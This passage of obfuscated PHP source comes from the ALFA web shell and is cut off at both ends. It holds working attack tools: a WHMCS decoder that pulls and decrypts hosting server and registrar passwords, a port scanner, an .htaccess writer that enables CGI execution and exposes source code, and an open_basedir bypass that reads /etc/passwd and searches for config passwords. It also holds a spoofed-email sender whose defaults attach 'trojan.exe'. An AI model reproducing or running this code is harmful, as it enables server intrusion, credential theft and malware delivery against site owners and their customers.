$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d = $nxtodlobf0b53b2da041fca49ef0b9839060b345;
$yyphbkaj4a8a08f09d37b73795649038408b5f33 = 0;
while ($yyphbkaj4a8a08f09d37b73795649038408b5f33 < strlen ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21))
{
if (($yyphbkaj4a8a08f09d37b73795649038408b5f33 != 0 AND $yyphbkaj4a8a08f09d37b73795649038408b5f33 % $jeplkfmp219696c345c0a93403933a08c81b6fac == 0))
{
$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d = _hash ($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d . substr ($vemvtkqkc68271a63ddbc431c307beb7d2918275, $yyphbkaj4a8a08f09d37b73795649038408b5f33 - $jeplkfmp219696c345c0a93403933a08c81b6fac, $jeplkfmp219696c345c0a93403933a08c81b6fac));
}
$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= chr (ord ($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d[$yyphbkaj4a8a08f09d37b73795649038408b5f33 % $jeplkfmp219696c345c0a93403933a08c81b6fac]) ^ ord ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21[$yyphbkaj4a8a08f09d37b73795649038408b5f33]));
++$yyphbkaj4a8a08f09d37b73795649038408b5f33;
}
return $vemvtkqkc68271a63ddbc431c307beb7d2918275;
}
function _hash($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21)
{
if(function_exists('sha1'))
{
$horyspio0800fc577294c34e0b28ad2839435945 = sha1 ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21);
}
else
{
$horyspio0800fc577294c34e0b28ad2839435945 = md5 ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21);
}
$vemvtkqkc68271a63ddbc431c307beb7d2918275 = '';
$yyphbkaj4a8a08f09d37b73795649038408b5f33 = 0;
while ($yyphbkaj4a8a08f09d37b73795649038408b5f33 < strlen ($horyspio0800fc577294c34e0b28ad2839435945))
{
$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= chr (hexdec ($horyspio0800fc577294c34e0b28ad2839435945[$yyphbkaj4a8a08f09d37b73795649038408b5f33] . $horyspio0800fc577294c34e0b28ad2839435945[$yyphbkaj4a8a08f09d37b73795649038408b5f33 + 1]));
$yyphbkaj4a8a08f09d37b73795649038408b5f33 += 2;
}
return $vemvtkqkc68271a63ddbc431c307beb7d2918275;
}
AlfaNum(8,9,10);
echo "<center><br><div class='txtfont_header'>| WHMCS DeCoder |</div><p>".getConfigHtml('whmcs')."</p><form onsubmit=\"g('Whmcs',null,this.form_action.value,'decoder',this.db_username.value,this.db_password.value,this.db_name.value,this.cc_encryption_hash.value,this.db_host.value); return false;\">
<input type='hidden' name='form_action' value='2'>";
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'cc_encryption_hash : ', 'inputName' => 'cc_encryption_hash', 'id' => 'cc_encryption_hash', 'inputValue' => '', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo "<p><input type='submit' value=' ' name='Submit'></p></form></center>";
if($_POST['alfa5']!=''){
$flhxoaev16a6214c4ae59965ca206d04f2b97f78=($_POST['alfa7']);
$woocdhun14b96808ee87870330b7c2d4f942993d=($_POST['alfa3']);
$rggyojaad4982f060b2fa15dc12996ce9cd5f310=($_POST['alfa4']);
$nksstcaw24e8d17701309eab9a46949f1eab03b1=($_POST['alfa5']);
$dnhhacaie8bd59452f341502dc3614d3e30ca4d3=($_POST['alfa6']);
echo __pre();
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($flhxoaev16a6214c4ae59965ca206d04f2b97f78,$woocdhun14b96808ee87870330b7c2d4f942993d,$rggyojaad4982f060b2fa15dc12996ce9cd5f310,$nksstcaw24e8d17701309eab9a46949f1eab03b1) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$ciexurcd1b1cc7f086b3f074da452bc3129981eb = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"SELECT * FROM tblservers");
$mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c = mysqli_num_rows($ciexurcd1b1cc7f086b3f074da452bc3129981eb);
if ($mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c > 0){
for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 <=$mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c-1; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
$hvlrcxnj9e3669d19b675bd57058fd4664205d2a = @mysqli_fetch_array($ciexurcd1b1cc7f086b3f074da452bc3129981eb);
$xqwrqnvc59fbc8df7b0bea3a26a2fb6771ea3eee = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['ipaddress'];
$rgusbycx14c4b06b824ec593239362517f538b29 = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['username'];
$hcgexxko599dcce2998a6b40b1e38e8c6006cb0a = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['type'];
$tkqmggcpc76a5e84e4bdee527e274ea30c680d79 = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['active'];
$ytrwprxy0897acf49c7c1ea9f76efe59187aa046 = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['hostname'];
echo("<center><table border='1'>");
$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = decrypt ($hvlrcxnj9e3669d19b675bd57058fd4664205d2a['password'], $dnhhacaie8bd59452f341502dc3614d3e30ca4d3);
echo("<tr><td><b><font color=\"#FFFFFF\">Type</font></td><td>$hcgexxko599dcce2998a6b40b1e38e8c6006cb0a</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Active</font></td><td>$tkqmggcpc76a5e84e4bdee527e274ea30c680d79</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Hostname</font></td><td>$ytrwprxy0897acf49c7c1ea9f76efe59187aa046</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Ip</font></td><td>$xqwrqnvc59fbc8df7b0bea3a26a2fb6771ea3eee</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Username</font></td><td>$rgusbycx14c4b06b824ec593239362517f538b29</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Password</font></td><td>$oimndblx5f4dcc3b5aa765d61d8327deb882cf99</td></tr></b>");
echo "</table><br><br></center>";
}
$arpygopa8b09fc98eb98edcff9700ee747064cd6 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"SELECT * FROM tblregistrars");
$mmqbwglzbc7150e29a3d90dbe393c3d5ecd10399 = @mysqli_num_rows($arpygopa8b09fc98eb98edcff9700ee747064cd6);
if ($mmqbwglzbc7150e29a3d90dbe393c3d5ecd10399 > 0){
for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 <=$mmqbwglzbc7150e29a3d90dbe393c3d5ecd10399 -1; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
$hvlrcxnj9e3669d19b675bd57058fd4664205d2a = mysqli_fetch_array($arpygopa8b09fc98eb98edcff9700ee747064cd6);
$lzimuern5940569cd1d60781f856f93235b072ee = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['registrar'];
$eqkcybqv7dc22b2c6a992f0232345df41303f5ea = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['setting'];
$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = decrypt($hvlrcxnj9e3669d19b675bd57058fd4664205d2a['value'], $dnhhacaie8bd59452f341502dc3614d3e30ca4d3);
if ($rkptsoeg2063c1608d6e0baf80249c42e2be5804==""){
$rkptsoeg2063c1608d6e0baf80249c42e2be5804=0;
}
echo("<center>Domain Reseller <br><center>");echo("<center><table border='1'>");
echo("<tr><td><b><font color=\"#67ABDF\">Register</font></td><td>$lzimuern5940569cd1d60781f856f93235b072ee</td></tr></b>");
echo("<tr><td><b><font color=\"#67ABDF\">Setting</font></td><td>$eqkcybqv7dc22b2c6a992f0232345df41303f5ea</td></tr></b>");
echo("<tr><td><b><font color=\"#67ABDF\">Value</font></td><td>$rkptsoeg2063c1608d6e0baf80249c42e2be5804</td></tr></b>");
echo "</table><br><br></center>";
}
}
}else{__alert('<font color="red">tblservers is Empty...!</font>');};
}
echo "</div>";
alfafooter();
}
function alfaportscanner(){
alfahead();
echo '<div class=header><center><p><div class="txtfont_header">| Port Scaner |</div></p>
<form action="" method="post" onsubmit="g(\'portscanner\',null,null,this.start.value,this.end.value,this.host.value); return false;">
<input type="hidden" name="y" value="phptools">
<div class="txtfont">Host: </div> <input id="text" type="text" name="host" value="localhost"/>
<div class="txtfont">Port start: </div> <input id="text" size="5" type="text"  name="start" value="80"/>
<div class="txtfont">Port end: </div> <input id="text" size="5" type="text" name="end" value="80"/> <input type="submit" value=" " />
</form></center><br>';
$lshuoojwea2b2676c28c0db26d39331a336c6b92 = strip_tags($_POST['alfa2']);
$qahbjcwq7f021a1415b86f2d013b2618fb31ae53 = strip_tags($_POST['alfa3']);
$wlerpykf67b3dba8bc6778101892eb77249db32e = strip_tags($_POST['alfa4']);
if(isset($_POST['alfa4']) && is_numeric($_POST['alfa3']) && is_numeric($_POST['alfa2'])){
echo __pre();
$agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe = "GET / HTTP/1.1\r\n\r\n";
if(ctype_xdigit($agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe))$agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe = @pack("H*" , $agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe);
else{
$agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe = str_replace(array("\r","\n"), "", $agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe);
$agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe = str_replace(array("\\r","\\n"), array("\r", "\n"), $agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe);
}
for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = $lshuoojwea2b2676c28c0db26d39331a336c6b92; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<=$qahbjcwq7f021a1415b86f2d013b2618fb31ae53; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
$vtmaxjse317d37b0edc7bd7cbd25d97f53a16ce5 = @fsockopen($wlerpykf67b3dba8bc6778101892eb77249db32e, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741, $irrxgcsz70106d0d821513f45702b7d25664ab7c, $ivgnqlyv809b1abe3f111fd3bb1a54c62706129f, 3);
if($vtmaxjse317d37b0edc7bd7cbd25d97f53a16ce5){
stream_set_timeout($vtmaxjse317d37b0edc7bd7cbd25d97f53a16ce5, 5);
fwrite($vtmaxjse317d37b0edc7bd7cbd25d97f53a16ce5, $agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe."\r\n\r\n\x00");
$khxsaonw886bb73b3156b0aa24aac99d2de0b238 = 0;
$ktkigkqe9624735240aafef0fa1f9fc48ca703f1 = 1;
$dtlsqvwpc1111bd512b29e821b120b86446026b8 = "";
do{
$yeshcnjz6438c669e0d0de98e6929c2cc0fac474 = fgets($vtmaxjse317d37b0edc7bd7cbd25d97f53a16ce5, 1024);
if(trim($yeshcnjz6438c669e0d0de98e6929c2cc0fac474)=="")$khxsaonw886bb73b3156b0aa24aac99d2de0b238++;
$dtlsqvwpc1111bd512b29e821b120b86446026b8 .= $yeshcnjz6438c669e0d0de98e6929c2cc0fac474;
}while($khxsaonw886bb73b3156b0aa24aac99d2de0b238<$ktkigkqe9624735240aafef0fa1f9fc48ca703f1);
fclose($vtmaxjse317d37b0edc7bd7cbd25d97f53a16ce5);
echo "<center><p>Port <font style='color:#DE3E3E'>$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741</font> is open</p>";
echo "<p><textarea style='height:140px;width:50%;'>".$dtlsqvwpc1111bd512b29e821b120b86446026b8."</textarea></p></center>";
}
flush();
}
}
echo '</div>';
alfafooter();
}
function alfacgihtaccess($cnspfppq6f8f57715090da2632453988d9a1501b,$iwxbtdws8277e0910d750195b448797616e091ad='', $wotiivfs4930ff3daf8e31b1f189819fcad77e1e=false){
$naxoinqt3905d7917f2b3429490b01cfb60d8f5b = "";
if($wotiivfs4930ff3daf8e31b1f189819fcad77e1e){$naxoinqt3905d7917f2b3429490b01cfb60d8f5b="\nReadmeName ".trim($wotiivfs4930ff3daf8e31b1f189819fcad77e1e);}
if($cnspfppq6f8f57715090da2632453988d9a1501b=='cgi'){
$nndigmblc13367945d5d4c91047b3b50234aa7ab = "#Coded By Sole Sad & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
}elseif($cnspfppq6f8f57715090da2632453988d9a1501b=='sym'){
$nndigmblc13367945d5d4c91047b3b50234aa7ab = "#Coded By Sole Sad & Invisible\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$naxoinqt3905d7917f2b3429490b01cfb60d8f5b}\nOptions all";
}elseif($cnspfppq6f8f57715090da2632453988d9a1501b=='shtml'){
$nndigmblc13367945d5d4c91047b3b50234aa7ab = "Options +Includes\nAddTypetext/html .shtml\nAddHandler server-parsed .shtml";
}
@__write_file($iwxbtdws8277e0910d750195b448797616e091ad . ".htaccess", $nndigmblc13367945d5d4c91047b3b50234aa7ab);
}
function alfabasedir(){
alfahead();
echo '<div class=header>
<center><p><div class="txtfont_header">| Open Base Dir |</div></p></center>';
$hkzphjmk76a2173be6393254e72ffa4d6df1030a = _alfa_file('/etc/passwd');
if(is_array($hkzphjmk76a2173be6393254e72ffa4d6df1030a)){
$qbyndzxd9bc65c2abec141778ffaa729489f3e87 = array();
$nddlimoycaf1642d28814084eb82983b9c9c88d6 = alfaMakePwd();
$nvzabqlc2d5ec04ac614a2ce7db2e49fce18670c = @ini_get('open_basedir');
$advbtcgoee5bd868ca96203f40dcfbcf40ea2a06 = @ini_get('safe_mode');
if(_alfa_can_runCommand(true,false)&&($nvzabqlc2d5ec04ac614a2ce7db2e49fce18670c||$advbtcgoee5bd868ca96203f40dcfbcf40ea2a06)){
$ozurlglxd574d4bb40c84861791a694a999cce69 = "fZBPSwMxEMXPzacYx9jugkvY9lbpTQ9eFU9NWdYk2wYkWZKsgmu+u9NaS8E/cwgDL/N+M+/yQjxbJ+KO3d4/rHjNusGpZL2DmEITTP/SKlOUIwOqNVTvgLxG2MB0CsGkITioz7X5P9riN60hzhHTvLYn5IoXfbAudYBXUUqHX9wPiEZDZQCj4OM807PIYovlwevHxPiHe0aWmVE7f7BaS4Ws8wEsWAe8UEOCSi+h6moQJinRtzG+6fIGtGeTp8c7Cqo4i4dAFB7xxiGakPdgSxtN6OxA/X7gePk3UtIPiddMe2dOe8wQN7NP";
$fjvlsuooad616a4bf9c50c6d567971ff896b5f29 = alfaWriteTocgiapi("basedir.alfa",$ozurlglxd574d4bb40c84861791a694a999cce69);
$cigfslwo150a2b14949ca7766549cf0cbba1a713  = alfaEx("cd ".$fjvlsuooad616a4bf9c50c6d567971ff896b5f29."/alfacgiapi;sh basedir.alfa ".$nddlimoycaf1642d28814084eb82983b9c9c88d6,false,true,true);
$qbyndzxd9bc65c2abec141778ffaa729489f3e87 = json_decode($cigfslwo150a2b14949ca7766549cf0cbba1a713, true);
$fyyftmba9dd4e461268c8034f5c8564e155c67a6=count($qbyndzxd9bc65c2abec141778ffaa729489f3e87);
if($fyyftmba9dd4e461268c8034f5c8564e155c67a6>=2){array_pop($qbyndzxd9bc65c2abec141778ffaa729489f3e87);--$fyyftmba9dd4e461268c8034f5c8564e155c67a6;}
}
if(!$nvzabqlc2d5ec04ac614a2ce7db2e49fce18670c&&!$advbtcgoee5bd868ca96203f40dcfbcf40ea2a06){
$fyyftmba9dd4e461268c8034f5c8564e155c67a6=0;
foreach($hkzphjmk76a2173be6393254e72ffa4d6df1030a as $okjeiabf341be97d9aff90c9978347f66f945b77){
$szfjzexy5e0bdcbddccca4d66d74ba8c1cee1a68 = strpos($okjeiabf341be97d9aff90c9978347f66f945b77,':');
$rgusbycx14c4b06b824ec593239362517f538b29 = substr($okjeiabf341be97d9aff90c9978347f66f945b77,0,$szfjzexy5e0bdcbddccca4d66d74ba8c1cee1a68);
$jexdzxtb89332de31569e1e3761758f8873be4ff = str_replace("{user}", $rgusbycx14c4b06b824ec593239362517f538b29, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
if(($rgusbycx14c4b06b824ec593239362517f538b29 != '')){
if (@is_readable($jexdzxtb89332de31569e1e3761758f8873be4ff)){
array_push($qbyndzxd9bc65c2abec141778ffaa729489f3e87,$rgusbycx14c4b06b824ec593239362517f538b29);
$fyyftmba9dd4e461268c8034f5c8564e155c67a6++;
}}}
}
echo '<br><br>';
echo "<b><font color=\"#00A220\">[+] Founded ".sizeof($hkzphjmk76a2173be6393254e72ffa4d6df1030a)." entrys in /etc/passwd\n"."<br /></font></b>";
echo "<b><font color=\"#FFFFFF\">[+] Founded ".$fyyftmba9dd4e461268c8034f5c8564e155c67a6." readable ".str_replace("{user}", "*", $nddlimoycaf1642d28814084eb82983b9c9c88d6)." directories\n"."<br /></font></b>";
echo "<b><font color=\"#FF0000\">[~] Searching for passwords in config files...\n\n"."<br /><br /><br /></font></b>";
foreach($qbyndzxd9bc65c2abec141778ffaa729489f3e87 as $eeodyzriee11cbb19052e40b07aac0ca060c23ee){
if(empty($eeodyzriee11cbb19052e40b07aac0ca060c23ee))continue;
$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = str_replace("{user}", $eeodyzriee11cbb19052e40b07aac0ca060c23ee, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#27979B>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$eeodyzriee11cbb19052e40b07aac0ca060c23ee</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485'><input type=submit value='>>'></form><br>";
}
}else{echo('<b> <center><font color="#FFFFFF">[-] Error : coudn`t read /etc/passwd [-]</font></center></b>');}
echo '<br><br></b>';
echo '</div>';
alfafooter();
}
function alfamail(){
alfahead();
echo '<div class=header>';
AlfaNum(8,9,10);
echo '<center><p><div class="txtfont_header">| Fake Mail |</div></p><form action="" method="post" onsubmit="g(\'mail\',null,this.mail_to.value,this.mail_from.value,this.mail_subject.value,\'>>\',this.mail_content.value,this.count_mail.value,this.mail_attach.value); return false;">';
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array(
'td1' => array('color' => 'FFFFFF', 'tdName' => 'Mail To : ', 'inputName' => 'mail_to', 'inputValue' => 'target@fbi.gov', 'inputSize' => '60','placeholder' => true),
'td2' => array('color' => 'FFFFFF', 'tdName' => 'From : ', 'inputName' => 'mail_from', 'inputValue' => 'sec@google.com', 'inputSize' => '60', 'placeholder' => true),
'td3' => array('color' => 'FFFFFF', 'tdName' => 'Subject : ', 'inputName' => 'mail_subject', 'inputValue' => 'your site hacked by me', 'inputSize' => '60'),
'td4' => array('color' => 'FFFFFF', 'tdName' => 'Attach File : ', 'inputName' => 'mail_attach', 'inputValue' => $GLOBALS['cwd'].'trojan.exe', 'inputSize' => '60'),
'td5' => array('color' => 'FFFFFF', 'tdName' => 'Count Mail : ', 'inputName' => 'count_mail', 'inputValue' => '1', 'inputSize' => '60')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo '<p><div class="txtfont">Message:</div></p><textarea rows="6" cols="60" name="mail_content">Hi Dear Admin :)</textarea><p><input type="submit" value=" " name="mail_send" /></p></form></center>';
if(isset($_POST['alfa4'])&&($_POST['alfa4'] == '>>')){
$gkcdrdwb7761328925cbb8a97e25d8cdf436687e = $_POST['alfa1'];
$dhbbltms9e35acb7edddb1772b2efd7d781ddcff = $_POST['alfa2'];
$cxhbzttfc7191005a7fff846844afd4be9509e77 = $_POST['alfa3'];
$gjfgehcpe7ade27667e6c2f068e2491ecab3190c = $_POST['alfa5'];
$zisjfpfj8f1240cce71bfde983efe8971d4a85d4 = (int)$_POST['alfa6'];
$mvufrnyvb09dcba661a9be84b1d59e8a113cae92 = $_POST['alfa7'];
if(filter_var($gkcdrdwb7761328925cbb8a97e25d8cdf436687e, FILTER_VALIDATE_EMAIL)){
if(!empty($mvufrnyvb09dcba661a9be84b1d59e8a113cae92)&&@is_file($mvufrnyvb09dcba661a9be84b1d59e8a113cae92)){
$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $mvufrnyvb09dcba661a9be84b1d59e8a113cae92;
$mveevork9a0364b9e99bb480dd25e1f0284c8555 = __read_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
$mveevork9a0364b9e99bb480dd25e1f0284c8555 = chunk_split(__ZW5jb2Rlcg($mveevork9a0364b9e99bb480dd25e1f0284c8555));
$uwdmfmmt9871d3a2c554b27151cacf1422eec048 = md5(uniqid(time()));
$ydojshxa435ed7e9f07f740abf511a62c00eef6e = basename($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4  = "From: ".$dhbbltms9e35acb7edddb1772b2efd7d781ddcff." <".$dhbbltms9e35acb7edddb1772b2efd7d781ddcff.">\r\n";
$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= "To: " . $gkcdrdwb7761328925cbb8a97e25d8cdf436687e. " ( ".$gkcdrdwb7761328925cbb8a97e25d8cdf436687e." ) \r\n";
$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= "Reply-To: ".$dhbbltms9e35acb7edddb1772b2efd7d781ddcff."\r\n";
$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= "Content-Type: multipart/mixed; boundary=\"".$uwdmfmmt9871d3a2c554b27151cacf1422eec048."\"\r\n\r\n";
$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= 'MIME-Version: 1.0' . "\r\n";
$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= 'X-Mailer: php' . "\r\n";
$gjfgehcpe7ade27667e6c2f068e2491ecab3190c  = "--".$uwdmfmmt9871d3a2c554b27151cacf1422eec048."\r\n";
$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "Content-type:text/plain; charset=iso-8859-1\r\n";
$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= $gjfgehcpe7ade27667e6c2f068e2491ecab3190c."\r\n\r\n";
$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "--".$uwdmfmmt9871d3a2c554b27151cacf1422eec048."\r\n";
$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "Content-Type: application/octet-stream; name=\"".$ydojshxa435ed7e9f07f740abf511a62c00eef6e."\"\r\n";
$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "Content-Transfer-Encoding: base64\r\n";
$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "Content-Disposition: attachment; filename=\"".$ydojshxa435ed7e9f07f740abf511a62c00eef6e."\"\r\n\r\n";
$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= $mveevork9a0364b9e99bb480dd25e1f0284c8555."\r\n\r\n";
$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "--".$uwdmfmmt9871d3a2c554b27151cacf1422eec048."--";
}else{
$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4  = "From: " . $dhbbltms9e35acb7edddb1772b2efd7d781ddcff. " ( ".$dhbbltms9e35acb7edddb1772b2efd7d781ddcff." ) \r\n";
$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= "To: " . $gkcdrdwb7761328925cbb8a97e25d8cdf436687e. " ( ".$gkcdrdwb7761328925cbb8a97e25d8cdf436687e." ) \r\n";
$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= 'Reply-To: '.$dhbbltms9e35acb7edddb1772b2efd7d781ddcff.'' . "\r\n";
$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= 'Content-type: text/html; charset=utf-8' . "\r\n";
$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= 'MIME-Version: 1.0' . "\r\n";
$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= 'X-Mailer: php' . "\r\n";
}
if(empty($zisjfpfj8f1240cce71bfde983efe8971d4a85d4)||$zisjfpfj8f1240cce71bfde983efe8971d4a85d4<1)$zisjfpfj8f1240cce71bfde983efe8971d4a85d4=1;
if(!empty($dhbbltms9e35acb7edddb1772b2efd7d781ddcff)){echo __pre();
for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<=$zisjfpfj8f1240cce71bfde983efe8971d4a85d4;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
if(@mail($gkcdrdwb7761328925cbb8a97e25d8cdf436687e,$cxhbzttfc7191005a7fff846844afd4be9509e77,$gjfgehcpe7ade27667e6c2f068e2491ecab3190c,$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4))echo("<center>Sent -> $gkcdrdwb7761328925cbb8a97e25d8cdf436687e<br></center>");
}}else{__alert("Invalid Mail From !");}
}else{__alert("Invalid Mail To !");}
}
echo('</div>');
alfafooter();
}
function alfaziper(){
alfahead();
AlfaNum(8,9,10);
echo '<div class=header><p><center><p><div class="txtfont_header">| Compressor |</div></p>
<form onSubmit="g(\'ziper\',null,null,null,this.dirzip.value,this.zipfile.value,\'>>\');return false;" method="post">
<div class="txtfont">Dir/File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['alfa3'])?htmlspecialchars($_POST['alfa3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
<div class="txtfont">Save Dir: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'alfa.zip" size="60"/>
<input type="submit" value=" " name="ziper" />
</form></center></p>';
if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>')){
$jfeaqldt1c837a6660014f0d862c65f9808fa839 = $_POST['alfa3'];
$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6 = $_POST['alfa4'];
if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
alfaEx("powershell Compress-Archive -Path '".addslashes($jfeaqldt1c837a6660014f0d862c65f9808fa839)."' -DestinationPath '".addslashes(basename($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6))."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'</font></b></p></center>';
}elseif($GLOBALS['sys']=='unix'&&_alfa_can_runCommand(true,true)){
alfaEx("cd '".addslashes(dirname($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6))."';zip -r '".addslashes(basename($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6))."' '".addslashes($jfeaqldt1c837a6660014f0d862c65f9808fa839)."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'</font></b></p></center>';
}elseif(class_exists('ZipArchive')){
if(__alfaziper($jfeaqldt1c837a6660014f0d862c65f9808fa839, $csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6)){
echo __pre().'<center><p><font color="green">Success...!<br>'.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'</font></p></center>';
}else{echo __pre().'<center><p><font color="red">ERROR!!!...</font></p></center>';}
}
}
echo '</div>';
alfafooter();
}
function __alfaziper($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb,$ioqwmeeq6990a54322d9232390a784c5c9247dd6){
	if(!extension_loaded('zip')||!file_exists($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb)){
		return false;
	}
	$zessjrwjadcdbd79a8d84175c229b192aadc02f2=new ZipArchive();
	if(!$zessjrwjadcdbd79a8d84175c229b192aadc02f2->open($ioqwmeeq6990a54322d9232390a784c5c9247dd6,ZIPARCHIVE::CREATE)){
		return false;
	}
	$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb=str_replace('\\','/',realpath($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb));
	if(is_dir($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb)===true){
		$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb),RecursiveIteratorIterator::SELF_FIRST);
